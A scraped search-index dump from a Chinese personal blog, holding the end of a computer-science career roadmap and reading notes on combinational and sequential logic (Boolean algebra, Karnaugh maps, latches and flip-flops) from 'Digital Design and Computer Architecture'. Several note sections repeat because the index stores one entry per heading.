Linux 从good-first-issue切入： 修复文档错误（如Documentation/filesystems/）。 提交驱动小补丁（如USB设备支持）。 参考：内核贡献指南。 DB levelDB MySQL PostgreSQL MariaDB TiDB RocksDB TiKV 分布式协议 paxos raft 图形学轮子 opengl vulkun direct3D 游戏引擎 Unreal ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:7:0","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#经典开源项目研究"},{"categories":null,"content":" 8 顶会论文阅读 \u0026 复现 Tip 本阶段搜集一些系统顶会，并且对其系统进行复现，根据论文对已有的系统进行一些优化。本阶段需要达到毕业博士生的科研水平。 系统方向顶会搜集 选择1篇OSDI'23存储方向论文（如《PolarFS》），在AWS上复现实验。 输出：GitHub仓库+性能对比报告 利用 AI 提取顶会关键词，整理顶会论文的 topic 及其发展历史 所有系统顶会阅读 复现顶会论文 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:8:0","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#顶会论文阅读--复现"},{"categories":null,"content":" 9 自我提升书籍阅读 Tip 本阶段阅读一些自我提升的书籍，增强自己对社会的认知水平、自己的思想水平、以及领导力。 《黑客：计算机革命的英雄》阅读 《Borland 传奇》阅读 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:9:0","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#自我提升书籍阅读"},{"categories":null,"content":" 10 个人项目开发 Tip 本阶段进行个人项目的开发，目的是像卡玛克和法布里斯贝拉那样实现一些改变世界的工程项目。 实现在自己的CPU上运行自己的操作系统、编译器、网络协议栈，携带图形界面，并且能运行超级玛丽和一些小游戏 构造出 RISC-V 架构上的全套系统，包括 CPU 模拟器、编译器/解释器、操作系统、网络协议栈、数据库等等 把那些成熟的开发产品都学习到位 手机上的创业idea全部实现完成 实现对人，对社会有用的产品，部分可以卖给企业，部分可以自己维护赚钱 失业者救助交流论坛开发 心理聊天室开发 利用自己的技术开发很多对社会有帮助的项目，无论是盈利还是非盈利 实现计算机科学一站式指导项目 做出足够震撼和足够有影响力的开源项目，要对自己有自信 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:10:0","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#个人项目开发"},{"categories":null,"content":" 11 找到工作并赚到钱 Tip 本阶段的目的是找到年薪百万的工作并赚到钱，攒钱 1000 万。 Security Bug Bounty，成为 hackerone 排行榜榜首 TopCoder CTF 游戏开发 外包接单 App 开发 Facebook Hacker cup 奖金 阿里天池、Kaggle 及其他数据科学竞赛奖金 留学生写作业 英语家教 设计代做 利用AI进行一些股票预测、量化交易、赛马预测搞钱 找到字节跳动岗位工作 Leetcode刷题 Leetcode系统设计题单 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:11:0","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#找到工作并赚到钱"},{"categories":null,"content":" 12 发表系统顶级会议论文 精读SOSP摘要，仿写3段。 SOSP POPL OOPSLA OSDI PLDI USENIX Security PPoPP HPCA ASPLOS MICRO USENIX ATC 📅 2025-9-17 FAST 9-17 📅 2025-9-26 EuroSys 9-26 📅 2025-7-16 SIGMOD VLDB ICSE（软件工程会议，如果有好的系统软件工具或者其他软件工具，可以发表这个会议的论文） ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:12:0","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#发表系统顶级会议论文"},{"categories":null,"content":" 13 终极目标 申请到MIT PDos Lab的phD，进行编译原理、操作系统、分布式系统、系统安全和数据库方向的研究 联系PDos Lab老师 text Subject: Questions about [Your Paper Title] Dear Prof. [Name], I replicated [Paper Title] and observed [Specific Finding]. Could you share insights on [Technical Question]? Attached: My replication report. 成为卡马克和法布里斯贝拉、Jeff Dean 那样的人，要做最棒的系统工程师、电子信息工程师和游戏工程师，在计算机行业打出名声，成为大富翁 ","date":"2024-08-25","objectID":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/:13:0","series":["记录"],"tags":null,"title":"计算机科学之路","uri":"/roadmap/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B9%8B%E8%B7%AF/#终极目标"},{"categories":["计算机体系结构"],"content":" 以下是 《Digital Design and Computer Architecture》 第 1-8 章的阅读笔记，目录采用原书结构，笔记内容为自己整理（3.5节 时序逻辑电路的时序特性分析跳过）。数字电路部分还可以参考这本教材：Fundamentals of Digital Logic with Verilog Design, THIRD EDITION (auhd.edu.ye) ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:0:0","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#"},{"categories":["计算机体系结构"],"content":" 1 Chapter 1：从 0 到 1","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:1:0","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#chapter-1从-0-到-1"},{"categories":["计算机体系结构"],"content":" 1.1 1.1 大纲 这一章主要为导引内容，比较简单，因此阅读笔记中仅介绍大纲和课后作业。 Abstraction Dicipline 3Y’s Deisng Dicipline Hierarchy Modularity Regularity Digital Abstraction：From Analog to Digital System Number System Decimal Numbers Binary Numbers Hexdecimal Numbers Bytes, Nibbles and All that Jazz 8 bits -\u003e bytes 4 bits -\u003e nibble Data in chunks -\u003e words -\u003e depend on the architecture of the microprocessor Memory size -\u003e bytes Communication speed -\u003e bits/sec Arithmetic Unsigned numbers Binary Addition 溢出判断：使用全加器时，最高位是否为 1 Signed Numbers Sign-magnitude representation 2’s complement representation 溢出判断：如果两数的符号位相同，最高位是否和他们不同 Comparison of Number System Unsigned Sign-Magnitude 2’s Complement Logic Gates Or And Not Buffer Nand Xor Beneath the Digital Abstraction CMOS Transistors* Power Consumption* ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:1:1","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#11-大纲"},{"categories":["计算机体系结构"],"content":" 2 Chapter 2：组合逻辑设计 这一章前面的布尔运算、公理和对偶式、卡诺图的使用、以及布尔代数到电路图的转换较为简单，因此不作详细说明，摆出重点公式和算法。 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:0","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#chapter-2组合逻辑设计"},{"categories":["计算机体系结构"],"content":" 2.1 2.1 Introduction组合逻辑电路主要有 4 个组成部分： 一个或多个输入 一个或多个输出 组合逻辑函数 表示组合逻辑延迟的时序 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:1","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#21-introduction"},{"categories":["计算机体系结构"],"content":" 2.2 2.2 Boolean Equations 2.2.1 最小项每个布尔变量，以原变量或者其反变量的形式，在各个\u0026式中出现一次。真值表中输出为 1 的行，可以表示为所有这种\u0026式的或。譬如有布尔变量A和B，其输出公式为$F(A,B)=\\bar{A}B+AB$将每个\u0026式表达为一个十进制的值（如 AB 对应0b11，其十进制的值为 3，该项就可以表示为m3），对他们进行|运算，这种表示就是最小项。其最小项公式可以表述为： $F(A,B)=\\Sigma(m1,m3)$ 2.2.2 最大项找到真值表中所有输出为 0 的行，将其中为 1 的布尔变量取反，和值为 0 的布尔变量相或。将每个这样的行的值相与，得到的就是最大项。 2.2.3 最大项和最小项的关系 最小项中的每一项结果都为 1，只要这些项有 1 个为 1，结果就为 1 最大项中每一项的结果都为 0，只要有一个项为 0，结果就为 0 最大项可以由最小项进行取反得到 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:2","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#22-boolean-equations"},{"categories":["计算机体系结构"],"content":" 2.2 2.2 Boolean Equations 2.2.1 最小项每个布尔变量，以原变量或者其反变量的形式，在各个\u0026式中出现一次。真值表中输出为 1 的行，可以表示为所有这种\u0026式的或。譬如有布尔变量A和B，其输出公式为$F(A,B)=\\bar{A}B+AB$将每个\u0026式表达为一个十进制的值（如 AB 对应0b11，其十进制的值为 3，该项就可以表示为m3），对他们进行|运算，这种表示就是最小项。其最小项公式可以表述为： $F(A,B)=\\Sigma(m1,m3)$ 2.2.2 最大项找到真值表中所有输出为 0 的行，将其中为 1 的布尔变量取反，和值为 0 的布尔变量相或。将每个这样的行的值相与，得到的就是最大项。 2.2.3 最大项和最小项的关系 最小项中的每一项结果都为 1，只要这些项有 1 个为 1，结果就为 1 最大项中每一项的结果都为 0，只要有一个项为 0，结果就为 0 最大项可以由最小项进行取反得到 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:2","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#最小项"},{"categories":["计算机体系结构"],"content":" 2.2 2.2 Boolean Equations 2.2.1 最小项每个布尔变量，以原变量或者其反变量的形式，在各个\u0026式中出现一次。真值表中输出为 1 的行，可以表示为所有这种\u0026式的或。譬如有布尔变量A和B，其输出公式为$F(A,B)=\\bar{A}B+AB$将每个\u0026式表达为一个十进制的值（如 AB 对应0b11，其十进制的值为 3，该项就可以表示为m3），对他们进行|运算，这种表示就是最小项。其最小项公式可以表述为： $F(A,B)=\\Sigma(m1,m3)$ 2.2.2 最大项找到真值表中所有输出为 0 的行，将其中为 1 的布尔变量取反，和值为 0 的布尔变量相或。将每个这样的行的值相与，得到的就是最大项。 2.2.3 最大项和最小项的关系 最小项中的每一项结果都为 1，只要这些项有 1 个为 1，结果就为 1 最大项中每一项的结果都为 0，只要有一个项为 0，结果就为 0 最大项可以由最小项进行取反得到 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:2","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#最大项"},{"categories":["计算机体系结构"],"content":" 2.2 2.2 Boolean Equations 2.2.1 最小项每个布尔变量，以原变量或者其反变量的形式，在各个\u0026式中出现一次。真值表中输出为 1 的行，可以表示为所有这种\u0026式的或。譬如有布尔变量A和B，其输出公式为$F(A,B)=\\bar{A}B+AB$将每个\u0026式表达为一个十进制的值（如 AB 对应0b11，其十进制的值为 3，该项就可以表示为m3），对他们进行|运算，这种表示就是最小项。其最小项公式可以表述为： $F(A,B)=\\Sigma(m1,m3)$ 2.2.2 最大项找到真值表中所有输出为 0 的行，将其中为 1 的布尔变量取反，和值为 0 的布尔变量相或。将每个这样的行的值相与，得到的就是最大项。 2.2.3 最大项和最小项的关系 最小项中的每一项结果都为 1，只要这些项有 1 个为 1，结果就为 1 最大项中每一项的结果都为 0，只要有一个项为 0，结果就为 0 最大项可以由最小项进行取反得到 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:2","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#最大项和最小项的关系"},{"categories":["计算机体系结构"],"content":" 2.3 2.3 Boolean Algebra 公理及其对偶式 单变量定理 多变量定理 真值表 简化真值表 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:3","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#23-boolean-algebra"},{"categories":["计算机体系结构"],"content":" 2.4 2.4 From Logic to Gates 单输出的 Gates：单个逻辑表达式 多输出的 Gates：多个逻辑表达式 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#24-from-logic-to-gates"},{"categories":["计算机体系结构"],"content":" 2.5 2.5 Multilevel Combinational Logic 硬件简化 Bubble Pushing ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:5","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#25-multilevel-combinational-logic"},{"categories":["计算机体系结构"],"content":" 2.6 2.6 X’s and Z’s, Oh MyX： 不合法的值，如输出同时出现 1 和 0，导致冲突 电路尚未初始化的值 卡诺图中的无关项（注意区分和电路中的区别） Z： 高阻态，非 0 也非 1 多见于三态门 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:6","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#26-xs-and-zs-oh-my"},{"categories":["计算机体系结构"],"content":" 2.7 2.7 Karnaugh Maps 一次在卡诺图中圈出一个大小为 1，2，4，8（或其他 2 的倍数）的块 每个圈都代表一个逻辑表达式 卡诺图的上下，左右的边缘相连 所有逻辑表达式的和就是，电路最后的简化逻辑表达式 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:7","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#27-karnaugh-maps"},{"categories":["计算机体系结构"],"content":" 2.8 2.8 Combinational Building Blocks 选择器 译码器 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:8","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#28-combinational-building-blocks"},{"categories":["计算机体系结构"],"content":" 2.9 2.9 Timing 2.9.1 Propagation 传播延迟：从输入改变 -\u003e 输出值完全稳定下来，中间所需要的时间，一个模块从输入到输出的传播延迟取决于最长的那条路径（关键路径） 最小延迟：从输入改变 -\u003e 输出开始改变，中间所需要的时间 2.9.2 Glitches 竞争冒险：多见于关键路径和最短路径输出的值不一样，而其值到达输出的时刻不一样，导致输出电路的值出现波动。 竞争冒险的消除可以通过向电路中增加卡诺图中的冗余项实现。冗余项来源于卡诺图中两个圈相切的部分，将相切的部分的两个圈化为一个圈，将其添加到电路中，即可消除竞争冒险。 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:9","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#29-timing"},{"categories":["计算机体系结构"],"content":" 2.9 2.9 Timing 2.9.1 Propagation 传播延迟：从输入改变 -\u003e 输出值完全稳定下来，中间所需要的时间，一个模块从输入到输出的传播延迟取决于最长的那条路径（关键路径） 最小延迟：从输入改变 -\u003e 输出开始改变，中间所需要的时间 2.9.2 Glitches 竞争冒险：多见于关键路径和最短路径输出的值不一样，而其值到达输出的时刻不一样，导致输出电路的值出现波动。 竞争冒险的消除可以通过向电路中增加卡诺图中的冗余项实现。冗余项来源于卡诺图中两个圈相切的部分，将相切的部分的两个圈化为一个圈，将其添加到电路中，即可消除竞争冒险。 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:9","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#propagation"},{"categories":["计算机体系结构"],"content":" 2.9 2.9 Timing 2.9.1 Propagation 传播延迟：从输入改变 -\u003e 输出值完全稳定下来，中间所需要的时间，一个模块从输入到输出的传播延迟取决于最长的那条路径（关键路径） 最小延迟：从输入改变 -\u003e 输出开始改变，中间所需要的时间 2.9.2 Glitches 竞争冒险：多见于关键路径和最短路径输出的值不一样，而其值到达输出的时刻不一样，导致输出电路的值出现波动。 竞争冒险的消除可以通过向电路中增加卡诺图中的冗余项实现。冗余项来源于卡诺图中两个圈相切的部分，将相切的部分的两个圈化为一个圈，将其添加到电路中，即可消除竞争冒险。 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:2:9","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#glitches"},{"categories":["计算机体系结构"],"content":" 3 Chapter 3：时序逻辑设计 这一章的时序逻辑分析和设计较为重要，学习过程中可以参考这个油管系列视频： Sequential Circuits - YouTube 学习完成之后可以： 完成华科的数字逻辑设计头歌平台所有作业 HDLBits Verilog语言学习 Vivado/Quartus Verilog编程环境配置 其他学校的数字电路实验课完成 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:0","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#chapter-3时序逻辑设计"},{"categories":["计算机体系结构"],"content":" 3.1 3.1 Introduction 组合逻辑电路的输出只和输入有关 时序逻辑电路的输出不只和输入有关，还和之前的状态相关 本章我们会 介绍时序逻辑电路的组成 状态变量的设计 介绍状态机 时序逻辑电路的效率 提高时序逻辑电路效率的方法：并行化 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:1","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#31-introduction"},{"categories":["计算机体系结构"],"content":" 3.2 3.2 Latches and Flip-Flops 上图中表示的是一个维持稳定状态的电路，为什么说它们维持稳定状态呢？ 对（a）中电路，如果 I2 的输入为 0，$\\bar{Q}$为 1，I1 的输入为 0，又传回 I2，电路状态永远不变。当 I2 的输入为 1 时，同上。 对（b）中电路，如果 I2 的输入为 0，那么 I1 的输入为 1，Q 为 0，$\\bar{Q}$为 1，电路状态保持不变；反之亦然。 在 Q 和$\\bar{Q}$的值变化的过程中，可能存在其他的状态，这个情况我们在后面会进行讨论。 以上的电路有 2 个状态，可以承载 1 个 bit 的信息。那么 N 个状态的电路，就可以承载$\\log_{2}N$个 bit 的信息。Q 是该电路的一个有效状态，$\\bar{Q}$也可以说是一个有效状态，但是我们知道它是 Q 的取反，因此知道 Q 就够了。 但是这个电路的不足在于，我们不知道他是什么状态，我们无法输入，这个问题需要修复。 3.2.1 SR Latch SR 锁存器特点： 2 个输入：S 和 R 2 个输出：Q 和$\\bar{Q}$ SR 锁存器真值表： S=0，R=0 N2 输出对 Q 取反，N1 输出对$\\bar{Q}$取反。因为 N2 的输出原本就是$\\bar{Q}$，N1 的输出原本就是 Q，因此状态不变 S=0，R=1 N1 输出 0（Q=0），N2 这里 Q 和 S 都是 0，因此输出 1（$\\bar{Q}$=1） S=1，R=0 N2 输出 0（$\\bar{Q}$=0），N1 这里$\\bar{Q}$和 R 都是 0，因此输出 1（$Q$=1） S=1，R=1 Q 和$\\bar{Q}$都输出 0，冲突，这种情况不应当存在 因为 R=1 时 Q=0，S=1 时 Q=1，因此 S 和 R 称为 Set 和 Reset。 SR 锁存器有一些问题： S 和 R 都为 1 时发生冲突，因此不应该让 SR 同时为 1 当某个输入被设置为 1 时，状态立刻改变，我们应当对这个改变的时刻加以控制。输入的改变和状态的改变，应当分开进行控制。 3.2.2 D Latch D 锁存器的出现是为了解决 SR 锁存器的上述两个问题，我们进行了两方面的调整： 引入输入 D 引入时钟信号 CLK，用 CLK 的高低控制锁存器的开闭 D 锁存器的工作机制和 SR 锁存器类似，当 CLK=1 时，S=$\\bar{D}$，否则 SR 寄存器保持原有状态，这种机制称为level-sensitive latch，也就是锁存器状态取决于 CLK 为 1 时电平信号的高低。 D 锁存器也有一点小小的缺陷，也就是 CLK 为 1 时，锁存器的状态完全取决于 D 电平信号的高低。如果 D 的电平信号震荡，锁存器的状态也会随之上下改变。我们希望能够实现锁存器状态的稳定，让状态更新在一个时刻完成，而不是一段时间，要解决这个问题，下面我们引入 D 触发器。 3.2.3 D flip-flop D 触发器由两个接入相反时钟状态的 D 锁存器构成，前一个称为master，后一个称为slave。其特性在于： 当 CLK=0 时，master打入值，slave的值不随master改变 当 CLK=1 时，slave打入值，master的值不随输入改变 因此，触发器的状态主要取决于 CLK 从 0 到 1 时，实现锁存器的状态转换，而其他时刻状态不变。这样就解决了 D 锁存器状态因转换的时间过长而带来的可能的状态震荡。该触发方式也叫边沿触发。 3.2.4 Register寄存器由多个触发器组成，可以存储多位的值，每个触发器存储 1 位的值，通过给他们连接同步的时实现。 3.2.5 Enabled Flip-Flop 使能触发器在普通的 D 触发器的基础上，增加了一个 2 选 1 数据选择器。数据选择器的选择端是使能信号，两个数据信号分别是输入 D 和触发器的之前状态。 其状态如下： Enable = 1 时，使能触发器输入为 D Enable = 0 时，使能触发器保持之前状态 使能触发器相对于 D 触发器做出的改进在于：我们只有在希望的时候才打入输入，而不是在每次时钟上升沿都打入。其控制能力相比 D 触发器更上一层。 3.2.6 Resettable Flip-Flop 可复位触发器相比使能触发器的区别在于，当 reset 信号为 1 时，与门输出为 0，打入的信号为 0，状态更新为 0，实现状态复位。该设置常用于对触发器进行同步/异步复位。 3.2.7 Transistor-Level Latch and Flip-Flop Designs* 此段省略。 3.2.8 Putting It All Together D 锁存器：高电平触发 D 触发器：时钟上升沿触发 3.2.9 Summary下面我们对本章介绍的多个锁存器和触发器、以及寄存器进行介绍，最重要的是D 触发器。 SR 锁存器：实现了过去状态的存储，但是 SR 均为 1 时电路无效，并且无法控制状态转换的时刻 D 锁存器：解决了 SR=1 时的无效状态，引入 CLK 时钟对电路进行控制，但是状态变化的间隔过长，容易导致在高电平期间，电路状态随着输入变化而持续变化，我们希望在某个时刻完成状态转换，然后保持其不变 D 触发器：采用master-slave结构，master接$\\bar{CLK}$，而slave接 CLK。master在低电平期间状态改变，其他时候不变。slave在高电平期间状态改变，其他时候不变。因此最终的结果是触发器的状态取决于时钟上升沿。但是在每次时钟上升沿，电路的状态都会随着输入的状态改变。因此我们希望设置一下电路是接受输入，还是保持状态不变 D 使能触发器：在 D 触发器的基础上增加一个数据选择器，利用使能信号来选择下一个时钟上升沿，打入slave的值是新的输入，还是电路之前的状态 D 复位触发器：将 D 触发器的输入和$\\bar{RESET}$进行与操作，如果RESET = 1，那么$\\bar{RESET} = 0$，输入为 0，实现了触发器的复位 寄存器：由多个触发器构成，每个触发器接的是相同的时钟 ","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:2","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#32-latches-and-flip-flops"},{"categories":["计算机体系结构"],"content":" 3.2 3.2 Latches and Flip-Flops 上图中表示的是一个维持稳定状态的电路，为什么说它们维持稳定状态呢？ 对（a）中电路，如果 I2 的输入为 0，$\\bar{Q}$为 1，I1 的输入为 0，又传回 I2，电路状态永远不变。当 I2 的输入为 1 时，同上。 对（b）中电路，如果 I2 的输入为 0，那么 I1 的输入为 1，Q 为 0，$\\bar{Q}$为 1，电路状态保持不变；反之亦然。 在 Q 和$\\bar{Q}$的值变化的过程中，可能存在其他的状态，这个情况我们在后面会进行讨论。 以上的电路有 2 个状态，可以承载 1 个 bit 的信息。那么 N 个状态的电路，就可以承载$\\log_{2}N$个 bit 的信息。Q 是该电路的一个有效状态，$\\bar{Q}$也可以说是一个有效状态，但是我们知道它是 Q 的取反，因此知道 Q 就够了。 但是这个电路的不足在于，我们不知道他是什么状态，我们无法输入，这个问题需要修复。 3.2.1 SR Latch SR 锁存器特点： 2 个输入：S 和 R 2 个输出：Q 和$\\bar{Q}$ SR 锁存器真值表： S=0，R=0 N2 输出对 Q 取反，N1 输出对$\\bar{Q}$取反。因为 N2 的输出原本就是$\\bar{Q}$，N1 的输出原本就是 Q，因此状态不变 S=0，R=1 N1 输出 0（Q=0），N2 这里 Q 和 S 都是 0，因此输出 1（$\\bar{Q}$=1） S=1，R=0 N2 输出 0（$\\bar{Q}$=0），N1 这里$\\bar{Q}$和 R 都是 0，因此输出 1（$Q$=1） S=1，R=1 Q 和$\\bar{Q}$都输出 0，冲突，这种情况不应当存在 因为 R=1 时 Q=0，S=1 时 Q=1，因此 S 和 R 称为 Set 和 Reset。 SR 锁存器有一些问题： S 和 R 都为 1 时发生冲突，因此不应该让 SR 同时为 1 当某个输入被设置为 1 时，状态立刻改变，我们应当对这个改变的时刻加以控制。输入的改变和状态的改变，应当分开进行控制。 3.2.2 D Latch D 锁存器的出现是为了解决 SR 锁存器的上述两个问题，我们进行了两方面的调整： 引入输入 D 引入时钟信号 CLK，用 CLK 的高低控制锁存器的开闭 D 锁存器的工作机制和 SR 锁存器类似，当 CLK=1 时，S=$\\bar{D}$，否则 SR 寄存器保持原有状态，这种机制称为level-sensitive latch，也就是锁存器状态取决于 CLK 为 1 时电平信号的高低。 D 锁存器也有一点小小的缺陷，也就是 CLK 为 1 时，锁存器的状态完全取决于 D 电平信号的高低。如果 D 的电平信号震荡，锁存器的状态也会随之上下改变。我们希望能够实现锁存器状态的稳定，让状态更新在一个时刻完成，而不是一段时间，要解决这个问题，下面我们引入 D 触发器。 3.2.3 D flip-flop D 触发器由两个接入相反时钟状态的 D 锁存器构成，前一个称为master，后一个称为slave。其特性在于： 当 CLK=0 时，master打入值，slave的值不随master改变 当 CLK=1 时，slave打入值，master的值不随输入改变 因此，触发器的状态主要取决于 CLK 从 0 到 1 时，实现锁存器的状态转换，而其他时刻状态不变。这样就解决了 D 锁存器状态因转换的时间过长而带来的可能的状态震荡。该触发方式也叫边沿触发。 3.2.4 Register寄存器由多个触发器组成，可以存储多位的值，每个触发器存储 1 位的值，通过给他们连接同步的时实现。 3.2.5 Enabled Flip-Flop 使能触发器在普通的 D 触发器的基础上，增加了一个 2 选 1 数据选择器。数据选择器的选择端是使能信号，两个数据信号分别是输入 D 和触发器的之前状态。 其状态如下： Enable = 1 时，使能触发器输入为 D Enable = 0 时，使能触发器保持之前状态 